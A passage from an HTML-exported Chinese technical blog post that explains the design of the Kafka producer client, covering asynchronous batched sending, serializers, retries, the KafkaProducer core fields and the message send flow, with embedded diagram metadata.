&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;11ea0ca8475c25600e025381ef63be27&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;367884fbcbab5d3d414ebf76c3dcf411&quot;&gt;从上面一篇文章 &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI3OTUwNjk2Mg==&amp;amp;mid=2247483681&amp;amp;idx=1&amp;amp;sn=4c05da3526010684bcaea3af9b0edda7&amp;amp;chksm=eb47f85cdc30714ace65fa1eabdb056fec217e55c628d87933ca4341aaac3f6ed6dd0e339e12&amp;amp;token=73482671&amp;amp;lang=zh_CN#rd&quot; target=&quot;_blank&quot;&gt;《Kafka 探险 - 架构简介》&lt;/a&gt; 了解到：消息队列常常用于多个系统之间的异步调用，那么这种调用关系就没有强实时依赖。由于发消息到 Kafka 会产生 &lt;code&gt;网络 I/O&lt;/code&gt; ，相对来说比较耗时，那么消息发送这一动作除了同步调用， &lt;code&gt;是否也可以设置为异步，提高生产者的吞吐呢?&lt;/code&gt; 。并且大量消息发送场景, 我们可以设置一个窗口，窗口可以是时间维度也可以是消息数量维度，将消息积攒起来批次发送，减少网络 I/O 次数，提高吞吐量。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;80bcaa9942ec1e35368b2422c2936e49&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;f5ab9378517d45ac6ee29492687b696e&quot;&gt;最后呢为了保证消息可以最大程度的成功发送到 Broker ，我们还需要一些 &lt;code&gt;失败重试机制&lt;/code&gt; ，例如失败后放到重试队列中，隔一段时间尝试再次发送。&lt;/p&gt;
&lt;p data-lake-id=&quot;30046bbd8e35642c7368c411fc7e6c3f&quot;&gt; &lt;/p&gt;
&lt;h2 id=&quot;7MB7b&quot; data-lake-id=&quot;cf1601059ba8c31d8d3b609327d54503&quot;&gt;理清思路&lt;/h2&gt;
&lt;p data-lake-id=&quot;17862c28a6a17254626e11859b4651f9&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;3050558aded30b00a3bf4be89c734d5d&quot;&gt;通过上面的分析，我们会有一个大致的认识，应该会有哪些方法，以及底层的大致的设计会分为哪几个部分。但是不够清楚，不够明晰。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;e9964b10d1167ff171f9f6be85ee656c&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;69c3e0b1fef9280a7a8a43d6a5292c1b&quot;&gt;首先总结一下实现客户端的几个要点在于：&lt;/p&gt;
&lt;ol start=&quot;1&quot; data-lake-id=&quot;c6f321bef4dac822e518faefdc4b9057&quot;&gt;&lt;li data-lake-id=&quot;836c0601033eff88a0dcbb1508dd0b8d&quot;&gt;配置 Broker 基础信息：集群地址、Topic、Partition&lt;/li&gt;
&lt;li data-lake-id=&quot;0e729064333c338faabdbbb7f9e59b22&quot;&gt;消息序列化，通过可扩展的序列化器实现&lt;/li&gt;
&lt;li data-lake-id=&quot;5e362697736eb1eefa2f9b65efab6907&quot;&gt;消息异步写入缓冲区，网络 I/O 线程实现消息发送&lt;/li&gt;
&lt;li data-lake-id=&quot;82ee7fb602ec3e491424cc48bfddbc53&quot;&gt;消息发送的失败重试机制&lt;/li&gt;
&lt;/ol&gt;&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;915d07e19b01bb6bcd49a1aee379b93d&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;1b4651cb40a61ad8b84136c4e188d377&quot;&gt;话不多说，用一张图画出各个核心模块以及他们之间的交互顺序：&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2021%2Fpng%2F171275%2F1610872577765-253a8871-3f71-4679-b1fc-c575054ffe4d.png%22%2C%22originWidth%22%3A1920%2C%22originHeight%22%3A1080%2C%22name%22%3A%22image.png%22%2C%22size%22%3A282624%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%7B%22x%22%3A623.19763%2C%22y%22%3A87.13152%2C%22width%22%3A93.06286999999998%2C%22height%22%3A31.501470000000012%2C%22text%22%3A%22Meta%22%7D%2C%7B%22x%22%3A954.01556%2C%22y%22%3A111.00703%2C%22width%22%3A79.60793999999987%2C%22height%22%3A28.541549999999987%2C%22text%22%3A%22fetch%22%7D%2C%7B%22x%22%3A332.92078%2C%22y%22%3A160.82%2C%22width%22%3A76.77679%2C%22height%22%3A20.291529999999995%2C%22text%22%3A%22Server%22%7D%2C%7B%22x%22%3A494.45993%2C%22y%22%3A177.48601%2C%22width%22%3A166.56662000000006%2C%22height%22%3A24.125650000000007%2C%22text%22%3A%22MetaoBserver%22%7D%2C%7B%22x%22%3A336.45966%2C%22y%22%3A197.67523%2C%22width%22%3A46.69695999999999%2C%22height%22%3A22.45642000000001%2C%22text%22%3A%22info%22%7D%2C%7B%22x%22%3A1424.5302%2C%22y%22%3A227.9253%2C%22width%22%3A186.65440000000012%2C%22height%22%3A54.21075000000002%2C%22text%22%3A%22BroKer%22%7D%2C%7B%22x%22%3A966.0458%2C%22y%22%3A225.8172%2C%22width%22%3A67.63890000000004%2C%22height%22%3A34.38119999999998%2C%22text%22%3A%22Push%22%7D%2C%7B%22x%22%3A511.7645%2C%22y%22%3A263.35617%2C%22width%22%3A96.60293000000001%2C%22height%22%3A33.62182999999999%2C%22text%22%3A%22update%22%7D%2C%7B%22x%22%3A296.24823%2C%22y%22%3A383.80603%2C%22width%22%3A372.41617%2C%22height%22%3A29.700439999999958%2C%22text%22%3A%22Nodes%26Topic%26partitionMeta%22%7D%2C%7B%22x%22%3A1565.9767%2C%22y%22%3A484.31793%2C%22width%22%3A85.90350000000012%2C%22height%22%3A24.269270000000006%2C%22text%22%3A%22write%22%7D%2C%7B%22x%22%3A1474.1243%2C%22y%22%3A578.913%2C%22width%22%3A163.17290000000003%2C%22height%22%3A29.463160000000016%2C%22text%22%3A%22%2Fothread%22%7D%2C%7B%22x%22%3A693.51624%2C%22y%22%3A597.93365%2C%22width%22%3A165.75675999999999%2C%22height%22%3A29.554950000000076%2C%22text%22%3A%22lntSerializer%22%7D%2C%7B%22x%22%3A346.43466%2C%22y%22%3A600.78973%2C%22width%22%3A100.89762000000002%2C%22height%22%3A30.165470000000028%2C%22text%22%3A%22lntMsg%22%7D%2C%7B%22x%22%3A1084.6962%2C%22y%22%3A597.3646%2C%22width%22%3A138.88879999999995%2C%22height%22%3A42.01504%2C%22text%22%3A%22msgpool%22%7D%2C%7B%22x%22%3A1316.9642%2C%22y%22%3A688.18274%2C%22width%22%3A66.06960000000004%2C%22height%22%3A25.07036000000005%2C%22text%22%3A%22take%22%7D%2C%7B%22x%22%3A1130.2554%2C%22y%22%3A689.0297%2C%22width%22%3A48.47689999999989%2C%22height%22%3A26.168049999999994%2C%22text%22%3A%22MSG%22%7D%2C%7B%22x%22%3A515.3785%2C%22y%22%3A689.5616%2C%22width%22%3A118.49014999999997%2C%22height%22%3A24.436140000000023%2C%22text%22%3A%22serialice%22%7D%2C%7B%22x%22%3A915.4335%2C%22y%22%3A690.6639%2C%22width%22%3A91.51830000000007%2C%22height%22%3A30.417100000000005%2C%22text%22%3A%22aPPend%22%7D%2C%7B%22x%22%3A319.5505%2C%22y%22%3A752.6249%2C%22width%22%3A146.49027%2C%22height%22%3A32.53049999999996%2C%22text%22%3A%22stringMsg%22%7D%2C%7B%22x%22%3A668.71747%2C%22y%22%3A754.0166%2C%22width%22%3A204.82562999999993%2C%22height%22%3A26.454899999999952%2C%22text%22%3A%22StxringSerializer%22%7D%2C%7B%22x%22%3A1135.6434%2C%22y%22%3A785.24695%2C%22width%22%3A42.62160000000017%2C%22height%22%3A23.68265000000008%2C%22text%22%3A%22MS9%22%7D%2C%7B%22x%22%3A1133.0742%2C%22y%22%3A880.0692%2C%22width%22%3A46.04299999999989%2C%22height%22%3A24.690899999999942%2C%22text%22%3A%22MSG%22%7D%2C%7B%22x%22%3A324.62674%2C%22y%22%3A905.7268%2C%22width%22%3A143.66412000000003%2C%22height%22%3A33.446230000000014%2C%22text%22%3A%22BinaryMsg%22%7D%2C%7B%22x%22%3A674.34155%2C%22y%22%3A907.6974%2C%22width%22%3A201.44312000000002%2C%22height%22%3A27.669599999999946%2C%22text%22%3A%22BiMarySerTalizer%22%7D%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22Meta%20fetch%20Server%20MetaoBserver%20info%20BroKer%20Push%20update%20Nodes%26Topic%26partitionMeta%20write%20%2Fothread%20lntSerializer%20lntMsg%20msgpool%20take%20MSG%20serialice%20aPPend%20stringMsg%20StxringSerializer%20MS9%20MSG%20BinaryMsg%20BiMarySerTalizer%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A960%2C%22height%22%3A540%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/171275/1610872577765-253a8871-3f71-4679-b1fc-c575054ffe4d.png?x-oss-process=image%2Fresize%2Cw_1500&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;540px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;85f624b49239dd5c86db2b2ad83b152b&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;308401506016166120f9f4a7adb8430f&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;5ead2f29f659ba74cad8978ac253a6e1&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;266743ac30314810000c209eccd95ebd&quot;&gt;用户设定 Kafka 集群信息，生产者从 Kafka Broker 上拉取 可用 Kafka 节点、Topic 以及 Partition 对应关系。缓存到生产者成员变量中，如果 Broker 集群有扩容，或者有机器下线需要重新获取这些服务信息。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;bf30aff7cf80443613b14804303cc1ab&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;ac7ec987f6654e18f10829bffe770acf&quot;&gt;客户端根据用户设置的序列化器，对消息进行序列化，之后异步的将消息写入到客户端缓冲区。缓冲区内的消息到达一定的数量或者到达一个时间窗口后，网络 I/O 线程将消息从缓冲区取走，发送到 Broker 。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;96d2a6c43a05ac715da2746f4d403b7d&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;f5544baa3fffaa0eff88ab514cc8ff0c&quot;&gt;以上就是我对于一个 Kafka 生产者实现的思考，接下来看看官方的代码设计与我们的思路有何差别，他又是为什么这么设计。&lt;/p&gt;
&lt;p data-lake-id=&quot;0f4dc9c9200e70f572190a1d1f063316&quot;&gt; &lt;/p&gt;
&lt;h2 id=&quot;Iv3TW&quot; data-lake-id=&quot;35168b0d9c1a021ccb840753a2244386&quot;&gt;官方设计&lt;/h2&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;d40b93ba6443fee193b49439bb2c036e&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;e94999d7786b0944789a4f0fdc520577&quot;&gt;其实经过上面的思考和整理，我们的设计已经非常接近 Kafka 的官方设计了，官方的模块拆分的更加细致，功能更加独立。&lt;/p&gt;
&lt;p data-lake-id=&quot;89684da51d45291464494feffd59c75a&quot;&gt; &lt;/p&gt;
&lt;h3 id=&quot;eQsYQ&quot; data-lake-id=&quot;f56871c12412135d14dcd9d31cffa7d7&quot;&gt;核心组件&lt;/h3&gt;
&lt;p data-lake-id=&quot;324ffb80de14de2f98a4a526f684791e&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;9c4fe4956c79567b69427d9ed7598989&quot;&gt;首先看一眼 KafkaProducer 类中有哪些成员变量，这些变量就是 Producer 的核心组件。&lt;/p&gt;
&lt;p data-lake-id=&quot;ea50ccbd23c6b90595c1f2b5d146ad16&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;ae6567f77c4c5c7ce4536c2a29ceb639&quot;&gt;&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2021%2Fpng%2F171275%2F1610875067431-2eb7521c-dccc-4f78-b97c-34a85e1e3d9a.png%22%2C%22originWidth%22%3A1112%2C%22originHeight%22%3A934%2C%22name%22%3A%22image.png%22%2C%22size%22%3A493386%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%7B%22x%22%3A117.077034%2C%22y%22%3A14.872167%2C%22width%22%3A204.086416%2C%22height%22%3A24.788436000000004%2C%22text%22%3A%22metrics%3AMetrics%22%7D%2C%7B%22x%22%3A113.03758%2C%22y%22%3A48.731823%2C%22width%22%3A537.7948799999999%2C%22height%22%3A39.770137%2C%22text%22%3A%22log%3ALogger-LoggerFactory.geLogger(...)%22%7D%2C%7B%22x%22%3A117.75624%2C%22y%22%3A92.77078%2C%22width%22%3A944.92466%2C%22height%22%3A32.32781%2C%22text%22%3A%22PRODUCERCLIENTIDSEQUENCE%3AATOMICItgEReWAToMICItegR(..)%22%7D%2C%7B%22x%22%3A118.74431%2C%22y%22%3A129.84894%2C%22width%22%3A494.20089%2C%22height%22%3A31.50278%2C%22text%22%3A%22JMX_PREFIX%3AStrIng%5C%22k.poducer%22%7D%2C%7B%22x%22%3A117.19122%2C%22y%22%3A175.14737%2C%22width%22%3A181.71921000000003%2C%22height%22%3A25.00018%2C%22text%22%3A%22clientld%3AString%22%7D%2C%7B%22x%22%3A53.850117%2C%22y%22%3A212.96684%2C%22width%22%3A17.591283000000004%2C%22height%22%3A17.591283000000004%2C%22text%22%3A%22%E5%B9%B2%22%7D%2C%7B%22x%22%3A114.87866%2C%22y%22%3A214.6225%2C%22width%22%3A277.57644000000005%2C%22height%22%3A28.327949999999987%2C%22text%22%3A%22partitioner%3APartitioner%22%7D%2C%7B%22x%22%3A116.498024%2C%22y%22%3A253.18224%2C%22width%22%3A256.175926%2C%22height%22%3A27.712230000000005%2C%22text%22%3A%22maxRequestSize%3Aint%22%7D%2C%7B%22x%22%3A115.51625%2C%22y%22%3A291.36896%2C%22width%22%3A280.5677%2C%22height%22%3A31.563319999999976%2C%22text%22%3A%22totalMemorySize%3Along%22%7D%2C%7B%22x%22%3A116.819984%2C%22y%22%3A335.5495%2C%22width%22%3A252.94801599999997%2C%22height%22%3A26.108059999999966%2C%22text%22%3A%22metadata%3AMetadata%22%7D%2C%7B%22x%22%3A116.14794%2C%22y%22%3A377.63568%2C%22width%22%3A418.39160999999996%2C%22height%22%3A20.55412000000001%2C%22text%22%3A%22accumulator%3ARecordAccumulator%22%7D%2C%7B%22x%22%3A117.59645%2C%22y%22%3A417.18262%2C%22width%22%3A190.86894999999998%2C%22height%22%3A22.157010000000014%2C%22text%22%3A%22sender%3ASender%22%7D%2C%7B%22x%22%3A116.3953%2C%22y%22%3A452.84058%2C%22width%22%3A211.71846999999997%2C%22height%22%3A27.37008000000003%2C%22text%22%3A%22ioThread%3AThread%22%7D%2C%7B%22x%22%3A116.91769%2C%22y%22%3A494.83923%2C%22width%22%3A451.46361%2C%22height%22%3A28.060869999999966%2C%22text%22%3A%22compressionType%3ACompressionTyp%22%7D%2C%7B%22x%22%3A118.346596%2C%22y%22%3A535.42084%2C%22width%22%3A175.39348399999997%2C%22height%22%3A22.752500000000055%2C%22text%22%3A%22errors%3ASensor%22%7D%2C%7B%22x%22%3A117.16353%2C%22y%22%3A574.8093%2C%22width%22%3A131.34239000000002%2C%22height%22%3A23.539639999999963%2C%22text%22%3A%22tIe%3ATie%22%7D%2C%7B%22x%22%3A55.266556%2C%22y%22%3A574.9878%2C%22width%22%3A14.189873999999996%2C%22height%22%3A14.189873999999996%2C%22text%22%3A%22f%22%7D%2C%7B%22x%22%3A115.198586%2C%22y%22%3A613.5729%2C%22width%22%3A457.15321400000005%2C%22height%22%3A27.978060000000028%2C%22text%22%3A%22keySerializer%3AExtendedSerializer%22%7D%2C%7B%22x%22%3A116.964745%2C%22y%22%3A655.262%2C%22width%22%3A482.633055%2C%22height%22%3A24.08750000000009%2C%22text%22%3A%22valueSerializer%3AExtenddSerializerV%3E%22%7D%2C%7B%22x%22%3A115.38361%2C%22y%22%3A695.7199%2C%22width%22%3A409.62349000000006%2C%22height%22%3A26.781599999999912%2C%22text%22%3A%22producerConfig%3AProducerConfig%22%7D%2C%7B%22x%22%3A114.55983%2C%22y%22%3A734.69775%2C%22width%22%3A290.27329999999995%2C%22height%22%3A25.58654999999999%2C%22text%22%3A%22maxBlockTimeMs%3Along%22%7D%2C%7B%22x%22%3A116.35335%2C%22y%22%3A774.34076%2C%22width%22%3A284.90297%2C%22height%22%3A27.739439999999945%2C%22text%22%3A%22requestTimeoutMs%3Aint%22%7D%2C%7B%22x%22%3A114.21915%2C%22y%22%3A813.9384%2C%22width%22%3A517.35495%2C%22height%22%3A26.18520000000001%2C%22text%22%3A%22interceptors%3AProducerlnterceptors%3CK%22%7D%2C%7B%22x%22%3A116.08592%2C%22y%22%3A854.05945%2C%22width%22%3A309.14784000000003%2C%22height%22%3A27.34895000000006%2C%22text%22%3A%22apiversions%3AApiversions%22%7D%2C%7B%22x%22%3A115.9882%2C%22y%22%3A897.272%2C%22width%22%3A519.1307%2C%22height%22%3A22.152439999999956%2C%22text%22%3A%22transactionManager%3ATransactionManager%22%7D%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22metrics%3AMetrics%20log%3ALogger-LoggerFactory.geLogger(...)%20PRODUCERCLIENTIDSEQUENCE%3AATOMICItgEReWAToMICItegR(..)%20JMX_PREFIX%3AStrIng%5C%22k.poducer%20clientld%3AString%20%E5%B9%B2%20partitioner%3APartitioner%20maxRequestSize%3Aint%20totalMemorySize%3Along%20metadata%3AMetadata%20accumulator%3ARecordAccumulator%20sender%3ASender%20ioThread%3AThread%20compressionType%3ACompressionTyp%20errors%3ASensor%20tIe%3ATie%20f%20keySerializer%3AExtendedSerializer%20valueSerializer%3AExtenddSerializerV%3E%20producerConfig%3AProducerConfig%20maxBlockTimeMs%3Along%20requestTimeoutMs%3Aint%20interceptors%3AProducerlnterceptors%3CK%20apiversions%3AApiversions%20transactionManager%3ATransactionManager%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A585%2C%22height%22%3A491%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/171275/1610875067431-2eb7521c-dccc-4f78-b97c-34a85e1e3d9a.png&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;491px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;df0f0fd92de60c6e44b219c8cc7360d0&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;a81ce09b629ae3f25247c2694fab98ed&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;bdac2023d07b3d5295c57218c9e62535&quot;&gt;其中核心字段的解释如下：&lt;/p&gt;
&lt;p data-lake-id=&quot;002ea7bb0a9e6efbbee35f91e7f03271&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;d50e69a7e8613a0808b8f05e4f68f19d&quot;&gt;&lt;code&gt;clinetId&lt;/code&gt; ：标识发送者Id&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;ff02ea2de74911c37be63b900042d31d&quot;&gt;&lt;code&gt;metric&lt;/code&gt; ：统计指标&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;1a787e48cadd901e6b8902902e15edc5&quot;&gt;&lt;code&gt;partitioner&lt;/code&gt; ：分区器作用是决定消息发到哪个分区。有 key 则按照 key 的 hash ，否则使用 roundrobin&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;fffc1506ce9fd9b0fa062cd5ea507169&quot;&gt;&lt;code&gt;key/value Serializer&lt;/code&gt; ：消息 key/value 序列化器&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;da7b6b9c659ff7f9dc4b667d45aa0693&quot;&gt;&lt;code&gt;interceptors&lt;/code&gt; ：发送之前/后对消息的统一处理&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;3413c559f77ddce2f0e55504cfdb54cc&quot;&gt;&lt;code&gt;maxRequestSize&lt;/code&gt; ：可以发送的最大消息，默认值是1M，即影响一个消息 Record 的大小，此值在服务端也是有限制的。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;9365eae211904f621452285855b3e86b&quot;&gt;&lt;code&gt;maxBlockTimeMs&lt;/code&gt; ：buffer满了或者等待metadata信息的，超时的补偿机制&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;5fa4c424c23b6e3c6d67d53f725e462c&quot;&gt;&lt;code&gt;accumulator&lt;/code&gt; ：累积缓冲器&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;92faeb508a1cb5ec7caf2532b49ba55b&quot;&gt;&lt;code&gt;networkClient&lt;/code&gt; ：包装的网络层&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;0cb5490d8ceb58e514429e5dd96ce843&quot;&gt;&lt;code&gt;sender&lt;/code&gt; ：网络 I/O 线程&lt;/p&gt;
&lt;p data-lake-id=&quot;db2927746f5a993611001e13f0ea03f4&quot;&gt; &lt;/p&gt;
&lt;h3 id=&quot;DP6rC&quot; data-lake-id=&quot;90d797e38c2b5220ce6da2cb361dcbcd&quot;&gt;发送流程&lt;/h3&gt;
&lt;p data-lake-id=&quot;b59b968973d58602e7cc2ca981c0cfd1&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;7e6b3931cff8e3d8cf8b68cfba174549&quot;&gt;发送一条消息的时候，数据又是怎样在这些组件之间进行流转的呢？&lt;/p&gt;
&lt;p data-lake-id=&quot;d157242428cb63593cef1c3d38ab5f85&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;e7042d48ff765a3d8046e4958ea5b55b&quot;&gt;&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2021%2Fpng%2F171275%2F1610877888481-03b77de5-ee4f-4675-a1e4-898ae597b4b5.png%22%2C%22originWidth%22%3A1920%2C%22originHeight%22%3A1080%2C%22name%22%3A%22image.png%22%2C%22size%22%3A353629%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%7B%22x%22%3A279.33572%2C%22y%22%3A36.189754%2C%22width%22%3A168.19474000000002%2C%22height%22%3A29.991576000000002%2C%22text%22%3A%22Userthread%22%7D%2C%7B%22x%22%3A695.5101%2C%22y%22%3A109.97615%2C%22width%22%3A112.92310000000009%2C%22height%22%3A28.767759999999996%2C%22text%22%3A%22Producer%22%7D%2C%7B%22x%22%3A1399.9758%2C%22y%22%3A132.47282%2C%22width%22%3A147.9906000000001%2C%22height%22%3A24.677359999999993%2C%22text%22%3A%22Partitioner%22%7D%2C%7B%22x%22%3A1049.7773%2C%22y%22%3A133.11081%2C%22width%22%3A127.76120000000014%2C%22height%22%3A26.04842000000002%2C%22text%22%3A%22Serializer%22%7D%2C%7B%22x%22%3A360.3435%2C%22y%22%3A135.01947%2C%22width%22%3A55.96792999999997%2C%22height%22%3A31.14152999999999%2C%22text%22%3A%22Msg%22%7D%2C%7B%22x%22%3A678.4011%2C%22y%22%3A152.89%2C%22width%22%3A145.67604999999992%2C%22height%22%3A31.226730000000003%2C%22text%22%3A%22lmterceptor%22%7D%2C%7B%22x%22%3A1290.4897%2C%22y%22%3A298.43655%2C%22width%22%3A201.73379999999997%2C%22height%22%3A27.170749999999998%2C%22text%22%3A%22SenderThread%22%7D%2C%7B%22x%22%3A272.78098%2C%22y%22%3A372.53497%2C%22width%22%3A554.36648%2C%22height%22%3A34.59110000000004%2C%22text%22%3A%22RecordAcculmulatorConcurrentHashMap%22%7D%2C%7B%22x%22%3A1416.387%2C%22y%22%3A378.47058%2C%22width%22%3A82.48910000000001%2C%22height%22%3A23.248080000000016%2C%22text%22%3A%22Sender%22%7D%2C%7B%22x%22%3A617.0934%2C%22y%22%3A417.90536%2C%22width%22%3A76.28620000000001%2C%22height%22%3A26.140870000000007%2C%22text%22%3A%22Deque%22%7D%2C%7B%22x%22%3A853.8798%2C%22y%22%3A492.40274%2C%22width%22%3A132.11885999999993%2C%22height%22%3A19.497619999999984%2C%22text%22%3A%22RecordBatch%22%7D%2C%7B%22x%22%3A644.2681%2C%22y%22%3A491.26675%2C%22width%22%3A132.5811%2C%22height%22%3A21.41485%2C%22text%22%3A%22RecordBatch%22%7D%2C%7B%22x%22%3A289.25638%2C%22y%22%3A492.489%2C%22width%22%3A227.89972000000006%2C%22height%22%3A30.590039999999988%2C%22text%22%3A%22ToPicPartitiono%22%7D%2C%7B%22x%22%3A1407.7068%2C%22y%22%3A565.95465%2C%22width%22%3A97.66340000000014%2C%22height%22%3A25.204849999999965%2C%22text%22%3A%22Request%22%7D%2C%7B%22x%22%3A615.5829%2C%22y%22%3A569.3663%2C%22width%22%3A73.00883999999996%2C%22height%22%3A23.04684999999995%2C%22text%22%3A%22Deque%22%7D%2C%7B%22x%22%3A287.30475%2C%22y%22%3A618.089%2C%22width%22%3A225.43011%2C%22height%22%3A37.33982999999989%2C%22text%22%3A%22ToPicPartitionl%22%7D%2C%7B%22x%22%3A649.26733%2C%22y%22%3A626.44135%2C%22width%22%3A129.62546999999995%2C%22height%22%3A19.687009999999987%2C%22text%22%3A%22RecordBatch%22%7D%2C%7B%22x%22%3A855.75%2C%22y%22%3A625.76044%2C%22width%22%3A131.60834%2C%22height%22%3A21.571860000000015%2C%22text%22%3A%22RecordBatch%22%7D%2C%7B%22x%22%3A1363.9708%2C%22y%22%3A753.5256%2C%22width%22%3A189.30409999999983%2C%22height%22%3A26.37239999999997%2C%22text%22%3A%22NetworkClient%22%7D%2C%7B%22x%22%3A1133.295%2C%22y%22%3A885.7433%2C%22width%22%3A66.57459999999992%2C%22height%22%3A26.25660000000005%2C%22text%22%3A%22Send%22%7D%2C%7B%22x%22%3A804.63116%2C%22y%22%3A930.22107%2C%22width%22%3A116.21668%2C%22height%22%3A35.80662999999993%2C%22text%22%3A%22Broker%22%7D%2C%7B%22x%22%3A1409.3851%2C%22y%22%3A938.34045%2C%22width%22%3A100.52269999999999%2C%22height%22%3A22.720249999999965%2C%22text%22%3A%22Selector%22%7D%2C%7B%22x%22%3A1138.5293%2C%22y%22%3A983.2442%2C%22width%22%3A97.03120000000013%2C%22height%22%3A32.12020000000007%2C%22text%22%3A%22Ack10%22%7D%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22Userthread%20Producer%20Partitioner%20Serializer%20Msg%20lmterceptor%20SenderThread%20RecordAcculmulatorConcurrentHashMap%20Sender%20Deque%20RecordBatch%20RecordBatch%20ToPicPartitiono%20Request%20Deque%20ToPicPartitionl%20RecordBatch%20RecordBatch%20NetworkClient%20Send%20Broker%20Selector%20Ack10%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A960%2C%22height%22%3A540%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/171275/1610877888481-03b77de5-ee4f-4675-a1e4-898ae597b4b5.png?x-oss-process=image%2Fresize%2Cw_1500&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;540px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;6bc8f5bae1705f68074108ab1893e0cc&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;3d2ca568baecf283206d57be066ce8ce&quot;&gt;Producer调用 send 方法后，在从 Broker 获取的 Metadata 有效情况下，经过拦截器和序列化后，被分区器放到了一个缓冲区的特定位置，缓冲区由一个 ConcurrentHashMap 构成，key 为主题分区，value 是一个 deque 存放消息缓存块。从客户端角度来看如果无需关心发送结果，发送流程就已经结束了。&lt;/p&gt;
